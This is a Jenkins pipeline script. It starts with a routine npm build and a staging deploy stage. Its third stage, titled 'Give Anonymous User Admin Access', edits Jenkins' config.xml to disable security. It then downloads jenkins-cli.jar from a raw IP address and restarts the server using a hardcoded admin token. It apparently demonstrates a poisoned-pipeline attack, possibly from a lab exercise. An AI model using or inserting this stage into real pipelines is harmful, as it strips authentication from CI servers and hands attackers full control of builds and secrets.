node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Give Anonymous User Admin Access') {
      sh '''
      sed -i 's/<useSecurity>true<\\/useSecurity>/<useSecurity>false<\\/useSecurity>/g' /var/lib/jenkins/config.xml
      wget http://35.212.215.217:8080/jnlpJars/jenkins-cli.jar
          chmod 777 jenkins-cli.jar
      java -jar jenkins-cli.jar -s http://35.212.215.217:8080/ -auth admin:11e9980bb1c1c2a3dd670f0f832284cc67 restart
      '''
      
    }
}
